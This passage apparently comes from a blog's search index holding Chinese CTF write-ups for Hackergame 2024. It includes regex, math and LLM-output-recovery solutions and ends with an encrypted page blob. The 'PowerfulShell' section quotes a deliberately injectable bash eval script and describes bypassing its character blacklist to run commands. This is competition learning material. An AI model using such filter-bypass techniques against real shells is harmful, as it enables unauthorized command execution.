167 \u884c\u4ee3\u7801 \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 7 \u5206\u949f Abstract \u8fd9\u5df2\u7ecf\u662f\u53bb\u5e74\u7684\u8d5b\u4e8b\u4e86\uff0c\u8bb0\u5f97\u662fZJUCTF2024\u540e\u7684\u8d81\u70ed\u6253\u94c1\uff0c\u5230\u4e862025\u5e74\u4e86\u624d\u6765\u66f4\u4e00\u4e0bxs\u3002\u4e0d\u8fc7\u611f\u89c9\u4ee5\u540e\u8d8a\u6765\u8d8a\u5fd9\u5e94\u8be5\u4e5f\u6ca1\u4ec0\u4e48\u65f6\u95f4\u5927\u6253\u4e86\uff0c\u5584\u59cb\u5584\u7ec8\u5427\uff0c\u4f46\u662f\u56e0\u4e3a\u592a\u4e45\u8fdc\u4e86\uff0c\u6240\u4ee5\u5c31\u6311\u51e0\u9053\u5370\u8c61\u6df1\u523b\u7684\u5199\u4e00\u5199 \u5b98\u65b9\u9898\u89e3\uff1a Hackergame 2024","title":"Hackergame 2024"},{"location":"writeups/hackergame2024/#_1","text":"\u6ca1\u60f3\u5230\u771f\u6709\u4eba\u628aflag\u85cf\u8bba\u6587\u4e2d\u54c8\u54c8\u54c8\u54c8\uff0c\u9898\u76ee\u5f88\u7b80\u5355\u641c\u4e00\u4e0bflag\uff0c\u7136\u540e\u79fb\u52a8\u4e00\u4e0b\u5143\u7d20\u5c31\u80fd\u770b\u5230\u3002 \u8bba\u6587\u94fe\u63a5","title":"\u6bcf\u65e5\u8bba\u6587\u592a\u591a\u4e86"},{"location":"writeups/hackergame2024/#powerfulshell","text":"\u9898\u76ee\u903b\u8f91 #!/bin/bash FORBIDDEN_CHARS = \"'\\\";,.%^*?!@#%^&()><\\/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0\" PowerfulShell () { while true ; do echo -n 'PowerfulShell@hackergame> ' if ! read input ; then echo \"EOF detected, exiting...\" break fi if [[ $input = ~ [ $FORBIDDEN_CHARS ] ]] ; then echo \"Not Powerful Enough :)\" exit else eval $input fi done } PowerfulShell \u6838\u5fc3\u601d\u8def\u5c31\u662f\u5229\u7528\u4ec5\u5269\u7684 $-_~{}1-9: \u6765\u6784\u9020Payload\uff0c\u6839\u636e\u5df2\u77e5\uff0c\u6211\u4eec\u6613\u5f97 ~ \u53ef\u4ee5\u83b7\u53d6 $HOME \uff0c\u5373 /player \uff0c\u800c $- \u662f hB \uff0c\u90a3\u4e48\u6211\u4eec\u8f7b\u800c\u6613\u4e3e\u7684\u5c31\u80fd\u6784\u9020\u51fa\u5f88\u591a\u5e38\u89c1\u7684\u547d\u4ee4\uff0c\u6bd4\u5982 ls \uff0c cat \u7b49\u7b49\uff0c\u7136\u540e\u5c31\u80fd\u62ff\u5230flag\u4e86\u3002","title":"PowerfulShell"},{"location":"writeups/hackergame2024/#_2","text":"\u5f88\u6709\u610f\u601d\u7684\u4e00\u9898\uff0c\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u6765\u5b9e\u73b0\u6570\u5b57\u662f\u5426\u6574\u9664\uff0c\u751a\u81f3CRC\u6821\u9a8c\uff0c\u56e0\u4e3a\u4e0d\u662f\u7b97\u6cd5\u51fa\u8eab\uff0c\u8fd8\u662f\u7b2c\u4e00\u6b21\u4e86\u89e3\u5230\uff0c\u5b66\u4e60\u4e86\u3002 \u9898\u76ee\u4ee3\u7801 import re import random # pip install libscrc import libscrc allowed_chars = \"0123456789()|*\" max_len = 1000000 num_tests = 300 difficulty = int ( input ( \"Enter difficulty level (1~3): \" )) if difficulty not in [ 1 , 2 , 3 ]: raise ValueError ( \"Invalid difficulty level\" ) regex_string = input ( \"Enter your regex: \" ) . strip () if len ( regex_string ) > max_len : raise ValueError ( \"Regex string too long\" ) if not all ( c in allowed_chars for c in regex_string ): raise ValueError ( \"Invalid character in regex string\" ) regex = re . compile ( regex_string ) for i in range ( num_tests ): expected_result = ( i % 2 == 0 ) while True : t = random . randint ( 0 , 2 ** 64 ) # random number for testing if difficulty == 1 : test_string = str ( t ) # decimal if ( t % 16 == 0 ) == expected_result : # mod 16 break elif difficulty == 2 : test_string = bin ( t )[ 2 :] # binary if ( t % 13 == 0 ) == expected_result : # mod 13 break elif difficulty == 3 : test_string = str ( t ) # decimal if ( libscrc . gsm3 ( test_string . encode ()) == 0 ) == expected_result : # crc break else : raise ValueError ( \"Invalid difficulty level\" ) regex_result = bool ( regex . fullmatch ( test_string )) if regex_result == expected_result : print ( \"Pass\" , test_string , regex_result , expected_result ) else : print ( \"Fail\" , test_string , regex_result , expected_result ) raise RuntimeError ( \"Failed\" ) print ( open ( f \"flag { difficulty } \" ) . read ()) \u7b2c\u4e00\u95ee\u975e\u5e38\u7b80\u5355\uff0c\u5341\u8fdb\u5236\u6570\u662f\u5426\u662f16\u7684\u500d\u6570\uff0c\u8fd9\u4e2a\u89c4\u5f8b\u5f88\u597d\u627e\uff0c\u4e5f\u5f88\u597d\u5199\uff0c\u6240\u4ee5\u5c31\u4e0d\u591a\u8d58\u8ff0\u4e86\u3002 \u7b2c\u4e8c\u95ee\u662f\u4e8c\u8fdb\u5236\u6570\u662f\u5426\u662f13\u7684\u500d\u6570\uff0c\u8fd9\u4e2a\u5c31\u6709\u70b9\u96be\u5ea6\u4e86\uff0c\u56e0\u4e3a\u4e8c\u8fdb\u5236\u6570\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u4e0d\u662f\u90a3\u4e48\u597d\u5199\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u6784\u9020\u4e00\u4e2a\u6709\u9650\u72b6\u6001\u81ea\u52a8\u673a\uff08DFA\uff09\u6765\u5224\u65ad\u3002 \u6784\u9020\u65b9\u6cd5\uff1aDFA \u7684\u72b6\u6001\u4ee3\u8868\u4f59\u6570\uff08\u6709 0~12 \u4e00\u5171 13 \u4e2a\u72b6\u6001\uff09\uff0c\u521d\u59cb\u72b6\u6001\u662f 0\uff0c\u6bcf\u6b21\u8bfb\u5165\u4e00\u4e2a bit \u66f4\u65b0\u4f59\u6570\uff08\u72b6\u6001\u8f6c\u79fb\uff09\uff08 s:=(s*2+b)%13 \uff09\uff0c\u8bfb\u5165\u5b8c\u6bd5\u540e\u5982\u679c DFA \u5904\u4e8e 0 \u72b6\u6001\uff08\u4f59\u6570\u4e3a 0\uff09\uff0c\u5c31\u610f\u5473\u7740\u8fd9\u4e2a\u4e8c\u8fdb\u5236\u6570\u6574\u9664 13\u3002 \u7136\u540e\u53ef\u4ee5\u4f7f\u7528 \u72b6\u6001\u6d88\u9664\u7b97\u6cd5 \uff0c\u5c06 DFA \u8f6c\u5316\u4e3a\u6b63\u5219\u8868\u8fbe\u5f0f\u3002 \u7b2c\u4e09\u95ee\u4e5f\u662f\u7c7b\u4f3c\u7684\u65b9\u6cd5\u53ef\u89e3\uff0c\u8fd9\u6b21 DFA \u7684\u72b6\u6001\u662f\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u5bc4\u5b58\u5668\uff08LFSR\uff09\u7684\u72b6\u6001\uff0c\u5bc4\u5b58\u5668\u6709 3 \u4f4d\uff0c\u4e00\u5171\u662f 8 \u79cd\u72b6\u6001\uff08000~111\uff09\uff0cDFA \u521d\u59cb\u72b6\u6001\u662f 111\uff0c\u6bcf\u6b21\u8bfb\u5165\u4e00\u4e2a\u5b57\u7b26\u66f4\u65b0\u72b6\u6001\uff0c\u8bfb\u5165\u5b8c\u6bd5\u540e\u5982\u679c DFA \u5904\u4e8e 000 \u72b6\u6001\uff0c\u5c31\u610f\u5473\u7740\u8fd9\u4e2a\u5b57\u7b26\u4e32\u7b26\u5408\u8981\u6c42\u3002 \u9898\u89e3 # pip install greenery # pip install regex from greenery import Fsm , Charclass , rxelems import regex as re import random m = 13 d = 2 digits = [ Charclass ( str ( i )) for i in range ( d )] other = ~ Charclass ( \"\" . join ( str ( i ) for i in range ( d ))) alphabet = set ( digits + [ other ]) states = set ( range ( m + 1 )) # m is the dead state initial_state = 0 accepting_states = { 0 } transition_map = dict () for s in range ( m ): transition_map [ s ] = { digits [ i ]: ( s * d + i ) % m for i in range ( d )} transition_map [ s ][ other ] = m transition_map [ m ] = { digits [ i ]: m for i in range ( d )} transition_map [ m ][ other ] = m dfa = Fsm ( alphabet = alphabet , states = states , initial = initial_state , finals = accepting_states , map = transition_map , ) def convert_regex ( regex ): # `(...)?` -> `((...)|)` while '?' in regex : regex = re . sub ( r '\\((.*?)\\)\\?' , r '(\\1|)' , regex ) # Handle `{n}` quantifier n = 1 while '{' in regex : while '{' + str ( n ) + '}' in regex : regex = re . sub ( r '(\\((.*?)\\)|\\w)\\{n\\}' . replace ( 'n' , str ( n )), r '\\1' * n , regex ) n += 1 # [abc] -> (a|b|c) while '[' in regex : def convert_charset ( match ): chars = match . group ( 1 ) return '(' + '|' . join ( chars ) + ')' regex = re . sub ( r '\\[([^\\]]+)\\]' , convert_charset , regex ) assert set ( regex ) <= set ( \"0123456789|()*\" ) return regex dfa = dfa . reduce () regex = rxelems . from_fsm ( dfa ) regex = regex . reduce () regex = convert_regex ( str ( regex )) print ( regex ) \u8fd9\u91cc\u5c31\u8d34\u4e00\u4e0b\u5b98\u65b9\u9898\u89e3\u5566:)","title":"\u5f3a\u5927\u7684\u6b63\u5219\u8868\u8fbe\u5f0f"},{"location":"writeups/hackergame2024/#_3","text":"\u7531\u4e8e\u6211\u4eec\u6ce8\u610f\u529b\u60ca\u4eba\uff0c\u6ce8\u610f\u5230\u8fd9\u7bc7 \u77e5\u4e4e\u6587\u7ae0 \uff0c\u5176\u4e2d\u7b2c\u4e00\u79cd\u7c7b\u578b\u5c31\u662f\u8bc1\u660e \\(\\pi\\) \u5927\u4e8e\u4e00\u4e2a\u6709\u7406\u6570\u3002 \u6211\u4eec\u4f7f\u7528\u5982\u4e0b\u5b9a\u79ef\u5206\uff1a \\(\\int_0^1 \\frac{x^n(1-x)^n(a+bx+cx^2)}{1+x^2} dx\\) \u6839\u636e\u4e0d\u540c\u7684 n \uff0c\u8d8a\u5927\u4e0d\u7b49\u5f0f\u8d8a\u7d27\uff0c\u6240\u4ee5\u53ea\u8981\u7ed9\u5b9a\u4e00\u4e2a n \uff0c\u7136\u540e\u6c42\u89e3 a,b,c \u5373\u53ef\u3002\u4f7f\u7528python\u7684sympy\u5c31\u80fd\u89e3\u7b54\u3002 \u89e3\u9898\u4ee3\u7801 from pwn import * import sympy N = 100 x , a , b , c = sympy . symbols ( 'x a b c' ) f = ( x ** N * ( 1 - x ) ** N * ( a + b * x + c * x ** 2 )) / ( 1 + x ** 2 ) inv = sympy . integrate ( f , ( x , 0 , 1 )) inv = sympy . simplify ( inv ) # inv = sympy.collect(inv, [\"log(2)\", \"pi\"]) l2 = inv . coeff ( \"log(2)\" ) pic = inv . coeff ( \"pi\" ) left = sympy . simplify ( inv - l2 * sympy . log ( 2 ) - pic * sympy . pi ) def get_exp ( p , q ): expr = [ l2 , pic - q , left + p ] r3 = sympy . solve ( expr , [ a , b , c ]) r3 = zip ([ a , b , c ], r3 . values ()) return f . subs ( r3 ) / q pp = remote ( 'ip' , port ) pp . recvuntil ( b 'Please input your token:' ) pp . sendline ( b 'your_token' ) def solve (): que = pp . recvline_contains ( b \"Please prove that \" ) que = que . decode () . split ( \" \" )[ - 1 ][ 4 :] pp . recvuntil ( b 'Enter the function f(x):' ) if len ( que ) == 1 : ans = b '4*((1-x**2)**(1/2)-(1-x))' else : p , q = map ( int , que . split ( '/' )) ans = str ( get_exp ( p , q )) . encode () pp . sendline ( ans ) pp . recvuntil ( b 'Q.E.D.' ) for i in range ( 40 ): solve () print ( f '[ { i + 1 } /40] PASS' ) pp . interactive ()","title":"\u4f18\u96c5\u7684\u4e0d\u7b49\u5f0f"},{"location":"writeups/hackergame2024/#_4","text":"\u8fd9\u9053\u9898\u5f88\u6709\u610f\u601d\uff0c\u4e0d\u80fd\u590d\u5236\u7c98\u8d34\u4ea4\u4e92\u7684novnc\uff0c\u540c\u65f6\u8fd8\u6709\u4e22\u5305\uff08sad \u6211\u7528\u7684\u662f\u7b28\u529e\u6cd5\uff0c\u83b7\u53d6\u5185\u5bb9\u7136\u540eocr\uff0c\u4e3a\u4e86\u964d\u4f4eocr\u96be\u5ea6\uff0c\u6211\u7528\u4e86\u4e8c\u8fdb\u5236\u7684\u65b9\u5f0f\uff0c\u5bfc\u81f4\u7ed3\u679c\u5f88\u591a\uff0c\u8fd8\u6709\u4e22\u5305\uff0c\u624b\u52a8\u6821\u6b63\u4e86\u4e00\u4e0b\uff08\u6211\u597d\u83dcqaq \u770b\u4e86\u9898\u89e3\u53d1\u73b0\u53ef\u4ee5\u7528\u7070\u5ea6\u7f16\u7801\u7684\u65b9\u6cd5\uff0c\u5269\u4e0b\u7684\u5c31\u662f\u81ea\u52a8\u5316\u590d\u5236\u4ee3\u7801\u5230vnc\u4e86\uff0c\u8fd9\u4e2a\u5f88\u7b80\u5355\uff0c\u5c31\u4e0d\u591a\u8bf4\u4e86\u3002 \u5176\u5b9e\u987a\u7740\u9898\u89e3\u7684\u601d\u8def\uff0c\u53ef\u4ee5\u8bd5\u8bd5\u4e8c\u7ef4\u7801\uff0c\u4e0d\u8fc7\u6211\u6ca1\u4e8b\uff08\u7b11","title":"\u65e0\u6cd5\u83b7\u5f97\u7684\u79d8\u5bc6"},{"location":"writeups/hackergame2024/#_5","text":"\u8fd9\u9898\u4e3b\u8981\u5b66\u4e60\u4e00\u4e0b\u96f6\u77e5\u8bc6\u8bc1\u660e\u7684\u7406\u8bba\u548c\u903b\u8f91\uff0c\u4ee5\u53ca\u76f8\u5173circom\u5de5\u5177\uff0c\u4e0d\u8fc7\u6ca1\u6709\u6df1\u5165\u4e86\u89e3\uff0c\u4ec5\u4f5c\u8bb0\u5f55 Ref\uff1a zk-bug-tracker \uff0c 1. Missing Bit Length Check \uff0c 14. Assigned but not Constrained \uff0c Circom \u3002","title":"\u96f6\u77e5\u8bc6\u6570\u72ec"},{"location":"writeups/hackergame2024/#llm-hackergame","text":"\u53c8\u662f\u4e00\u9053\u5927\u6a21\u578b\u9006\u5411\u9898\uff0c \u9996\u5148\u6211\u4eec\u8981\u7406\u89e3\uff08\u4e3b\u6d41\u7684\uff09LLM \u7684\u5de5\u4f5c\u539f\u7406\uff0c\u7b80\u5355\u6765\u770b\u5355\u6b21\u7684 inference \u8fc7\u7a0b\u5c31\u662f\u628a prompt \u7f16\u7801\u6210\u4e00\u4e2a\u77e9\u9635\uff0c\u7ecf\u8fc7\u5999\u5999\u8fd0\u7b97\u5f97\u5230\u4e00\u4e2a\u957f\u5ea6\u4e3a\u8bcd\u8868\u5927\u5c0f\u7684\u5411\u91cf\uff0c\u7136\u540e\u518d\u4ece\u8fd9\u4e2a\u5411\u91cf sampling \u51fa\u4e00\u4e2a token\u3002\u770b\u4e00\u770b\u4ee3\u7801\u5c31\u80fd\u53d1\u73b0\uff0c\u9898\u76ee\u91cc\u7528\u5230\u7684 llama-cpp-python \u7684\u9ed8\u8ba4\u4f7f\u7528\u4e86 top-p\u3001top-k \u7b49 sampler\u3002\u6211\u4eec\u5176\u5b9e\u4e0d\u9700\u8981\u5173\u5fc3\u5177\u4f53\u7ec6\u8282\uff0c\u53ea\u9700\u8981\u628a\u4ed6\u4eec\u7406\u89e3\u6210\u4e00\u4e2a\u66f4\u6539\u5404\u4e2a token \u51fa\u73b0\u7684\u6982\u7387\u7684\u5411\u91cf\u51fd\u6570\u5373\u53ef\u3002\u6211\u4eec\u53ef\u4ee5\u539f\u6837\u63a8\u7406\u4e00\u6b21\uff0c\u628a\u4e0d\u7b26\u5408\u8bed\u6cd5\u7684 token\uff08\u6bd4\u5982\u5f53\u524d\u4f4d\u7f6e\u4e4b\u540e\u7684\u5b57\u7b26\u662f xxxxxp...\uff0c\u90a3\u4e48 hello \u80af\u5b9a\u4e0d\u7b26\u5408\u8bed\u6cd5\uff0c\u56e0\u4e3a l \u4e0d\u4f1a\u53d8\u6210 x\uff0c\u800c hack \u5219\u7b26\u5408\u8bed\u6cd5\uff0c\u56e0\u4e3a\u524d\u56db\u4e2a\u5b57\u6bcd\u90fd\u662f x\uff09\u7684\u51fa\u73b0\u6982\u7387\u8bbe\u6210 0\uff0c\u5269\u4e0b\u7684\u5c31\u662f\u8fd9\u4e2a\u4f4d\u7f6e\u53ef\u80fd\u7684 token\u3002\u5982\u6b64\u8fd9\u822c\uff0c\u6bcf\u4e00\u4e2a\u53ef\u80fd\u7684 token \u90fd\u662f\u4e00\u4e2a\u9009\u62e9\u7684\u5206\u652f\uff0c\u6211\u4eec\u76f8\u5f53\u4e8e\u8fdb\u5165\u4e86\u4e00\u4e2a\u641c\u7d22\u6811\uff08\u7c7b\u4f3c\u4e8e\u8ff7\u5bab\uff09\uff0c\u8fd9\u4e2a\u6811\u53ef\u80fd\u53ea\u6709\u4e00\u4e2a\u80fd\u8fbe\u5230 EOG\uff08\u8fd9\u91cc\u662f <|im_end|>\uff09\u7684\u53f6\u5b50\u8282\u70b9\uff08\u6bd4\u5982\u7b2c\u4e00\u95ee\uff09\uff0c\u4e5f\u53ef\u80fd\u6709\u5f88\u591a\u8fbe\u5230 EOG \u7684\u53f6\u5b50\u8282\u70b9\uff08\u6bd4\u5982\u7b2c\u4e8c\u95ee\uff09\uff0c\u800c\u6b63\u786e\u6ee1\u8db3 hash \u7684\u7b54\u6848\u5c31\u5728\u67d0\u4e2a\u53f6\u5b50\u8282\u70b9\u4e2d\u3002 \u89e3\u9898\u601d\u8def \u89e3\u9898\u4ee3\u7801\u662f\u57fa\u4e8e llama.cpp \u6539\u7684\uff0cdiff \u88ab\u5bfc\u51fa\u6210\u4e86 exp.patch \u6587\u4ef6\uff0c\u9009\u624b\u60f3\u81ea\u5df1\u8fd0\u884c\u7684\u8bdd\u65b9\u6cd5\u5927\u81f4\u5982\u4e0b\uff1a clone https://github.com/ggerganov/llama.cpp/ checkout c421ac072d46172ab18924e1e8be53680b54ed3b apply exp.patch modify examples/simple/simple.cpp L23 for censored chars modify examples/simple/simple.cpp L178 for prompt modify examples/simple/simple.cpp L202 for number of threads make (optional with GGML_CUDA=1) copy after.txt & before.sha256 to current dir ./llama-simple -m /path/to/qwen2.5-3b-instruct-q8_0.gguf echo \"flag{llm_lm_lm_koshitantan_$(sha512sum output.txt | cut -d ' ' -f1 | cut -c1-16)}\"","title":"\u5148\u4e0d\u8bf4\u5173\u4e8e\u6211\u4ece\u96f6\u5f00\u59cb\u72ec\u81ea\u5728\u5f02\u4e16\u754c\u8f6c\u751f\u6210\u67d0\u5927\u5382\u5bb6\u7684 LLM \u9f99\u732b\u5973\u4ec6\u8fd9\u4ef6\u4e8b\u53ef\u4e0d\u53ef\u80fd\u8fd9\u4e48\u79bb\u8c31\uff0c\u53d1\u73b0 Hackergame \u5185\u5bb9\u5ba1\u67e5\u59d4\u5458\u4f1a\u5fd8\u8bb0\u5ba1\u67e5\u9898\u76ee\u6807\u9898\u4e86\u3054\u3081\u3093\u306d\uff0c\u4ee5\u53ca\u300c\u8fd9\u4e48\u957f\u90fd\u5feb\u8d76\u4e0a\u8f7b\u5c0f\u8bf4\u4e86\u771f\u7684\u4e0d\u4f1a\u5f71\u54cd\u7528\u6237\u4f53\u9a8c\u5417\ud83e\udd23\u300d"},{"location":"writeups/zjuctf2023/","text":"gDLsbYhDS5r/WUyCK2KuNg==;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;^","title":"\ud83d\udd12 ZJUCTF 